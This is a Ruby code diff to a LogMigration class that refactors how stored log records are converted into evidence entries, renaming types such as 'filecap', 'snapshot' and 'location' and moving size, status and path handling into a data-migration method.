@@ -221,7 +221,6 @@ class LogMigration
       e.data = migrate_data(log)
 
       # unify the files evidence
-      e.data[:size] = log[:longblob1].bytesize if e.type == 'filecap'
       e.type = 'file' if e.type == 'filecap' or e.type == 'fileopen' or e.type == 'download'
 
       # unify mail, sms, mms
@@ -230,9 +229,6 @@ class LogMigration
       # rename it
       e.type = 'screenshot' if e.type == 'snapshot'
       e.type = 'position' if e.type == 'location'
-
-      # remove unneeded
-      e.data.delete 'status' if e.type == 'mic' or e.type == 'call'
 
       # save the binary data
       if log[:longblob1].bytesize > 0
@@ -343,8 +339,15 @@ class LogMigration
 
     # keep the subtype into messages
     if log[:type] == 'mail' or log[:type] == 'sms' or log[:type] == 'mms'
-      data[:type] = log[:type]
+      data[:type] = log[:type].to_sym
     end
+
+    # remove unneeded
+    data.delete 'status' if log[:type] == 'MIC' or log[:type] == 'CALL'
+
+    data[:size] = log[:longblob1].bytesize if log[:type] == 'FILECAP'
+
+    data[:path].gsub!("\\\\", "\\") if log[:type] == 'FILESYSTEM'
 
     return data
   end
